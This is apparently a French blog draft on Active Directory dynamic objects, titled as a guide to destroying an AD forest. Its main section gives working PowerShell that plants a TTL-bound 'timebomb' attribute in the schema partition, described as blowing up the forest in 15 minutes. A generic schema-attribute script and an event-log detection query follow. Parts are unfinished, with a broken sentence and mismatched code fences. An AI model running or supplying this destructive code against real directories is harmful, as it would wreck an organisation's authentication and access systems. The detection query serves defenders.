---
title: "Comment détruire votre Active Directory"
description: "Votre forêt s'auto-détruira dans 3, 2, 1..."
tags: active-directory
listed: true
---

Création d'un objet temporaire dans le schéma Active Directory

[PowerShell Gallery \| scripts/New-ADSchemaTestOID.ps1 0.0.3](https://www.powershellgallery.com/packages/ADSchema/0.0.3/Content/scripts%5CNew-ADSchemaTestOID.ps1)

[PowerShell Gallery \| scripts/New-ADSchemaAttribute.ps1 0.0.1](https://www.powershellgallery.com/packages/ADSchema/0.0.1/Content/scripts%5CNew-ADSchemaAttribute.ps1)


## Comportement d'un objet dynamique

### Création d'un objet statique dans un objet dynamique

Lorsque vous 

Aucun problème en revanche pour créer un objet dynamique dans un autre objet dynamique

"Windows cannot create the object testGroup because: The server is unwilling to process the request"

## Détruire votre domaine Active Directory

### Création d'un objet temporaire dans le schéma

Basé sur l'article : [Create and manage custom AD attributes with PowerShell – 4sysops](https://4sysops.com/archives/create-and-manage-custom-ad-attributes-with-powershell/#rtoc-4)

#### Génération d'un OID

```powershell
function New-Oid {
    param([string]$Prefix = '1.2.840.113556.1.8000.2554')

    $guid = [string]([System.Guid]::NewGuid())
    $oid = 0, 4, 9, 14, 19, 24, 30 | ForEach-Object {
        if ($_ -ge 24) { $l = 6 } else { $l = 4 }
        [UInt64]::Parse($guid.SubString($_, $l), 'AllowHexSpecifier')
    }
    $prefix + ($oid -join '.')
}
```

#### Ajout d'un nouvel attribut

```powershell
# Création de l'attribut en dehors de la partition Schéma
$dynamicObject = ([ADSI]("LDAP://CN=Users,DC=contoso,DC=com")).Create('attributeSchema', 'CN=timebomb')
$dynamicObject.PutEx(2, 'objectClass', @('dynamicObject', 'attributeSchema'))
$dynamicObject.Put('entryTTL', 900)
$dynamicObject.Put('lDAPDisplayName', 'timebomb')
$dynamicObject.Put('adminDescription', 'This attribute will blow up the entire Active Directory forest in 15 minutes')
$dynamicObject.Put('attributeId', (New-Oid))
$dynamicObject.Put('oMSyntax', 1)
$dynamicObject.Put('attributeSyntax', '2.5.5.8')
$dynamicObject.Put('searchflags', 0)
$dynamicObject.SetInfo()
```

```powershell
# Déplacement de l'objet dans la partition schéma
Move-ADObject -Identity 'CN=timebomb,CN=Users,DC=contoso,DC=com' -TargetPath (Get-ADRootDSE).schemaNamingContext
```





function Get-ADSyntaxType {
    param([ValidateSet('Boolean', 'Enumeration', 'Integer', 'LargeInteger', 'Object(DN-String)', 'String(Unicode)', 'String(UTC-Time)')][string]$Type)

    switch ($Type) {
        'Boolean'           { $omSyntax = 1   ; $attrSyntax = '2.5.5.8' }
        'Enumeration'       { $omSyntax = 10  ; $attrSyntax = '2.5.5.9' }
        'Integer'           { $omSyntax = 2   ; $attrSyntax = '2.5.5.9' }
        'LargeInteger'      { $omSyntax = 65  ; $attrSyntax = '2.5.5.16' }
        'Object(DN-String)' { $omSyntax = 127 ; $attrSyntax = '2.5.5.14' }
        'String(Unicode)'   { $omSyntax = 64  ; $attrSyntax = '2.5.5.12' }
        'String(UTC-Time)'  { $omSyntax = 23  ; $attrSyntax = '2.5.5.11' }
    }

    [PSCustomObject]@{
        oMSyntax = $omSyntax
        attributeSyntax = $attrSyntax
    }
}

# get AD schema path
$adSchema = (Get-ADRootDSE).schemaNamingContext
 
# get user schema
$userSchema = Get-ADObject -SearchBase $adSchema -Filter "Name -eq 'User'"
# set the short name for custom attribute with no spaces
$attributeName = "CampusName"
# set the short description for custom attribute
$attributeDesc = "Campus Name"
# paste the OID generated by "Generate-OID.ps1" script
$OID = "1.2.840.113556.1.8000.2554.56779.46056.47028.16885.40810.7627542.10407433"
# oMSyntax is "64" for String (Unicode). Refer this link for other types: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7cda533e-d7a4-4aec-a517-91d02ff4a1aa
$oMSyntax = 64
# attributeSyntax is "2.5.5.12" for String (Unicode). Refer this link for other types: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7cda533e-d7a4-4aec-a517-91d02ff4a1aa
$attributeSyntax = "2.5.5.12"
# set the indexable value to "1" if you want AD to index this attribute. set this only if you would be querying this AD attribute a lot.
$indexable = 0
# build custom attributes hashtable
$adAttributes = @{
  lDAPDisplayName = $attributeName;
  adminDescription = $attributeDesc;
  attributeId = $OID;
  oMSyntax = $oMSyntax;
  attributeSyntax = $attributeSyntax;
  searchflags = $indexable
}
# create the custom attribute in AD schema
New-ADObject -Name  $attributeName -Type attributeSchema -Path $adSchema -OtherAttributes $adAttributes
 
# add the custom attribute to user class
$userSchema | Set-ADObject -Add @{mayContain = $attributeName}
```

## Détection de la création d'objet dynamique


```powershell
$filterXPath = "Event[System[EventID=5136]] and *[EventData[Data[@Name='AttributeValue']='1.3.6.1.4.1.1466.101.119.2']]"
Get-WinEvent -ProviderName Microsoft-Windows-Security-Auditing -FilterXPath $filterXPath
```

[AD Object Detection: Detecting the undetectable (dynamicObject) \| Microsoft Learn](https://learn.microsoft.com/en-us/archive/blogs/pfesweplat/ad-object-detection-detecting-the-undetectable-dynamicobject)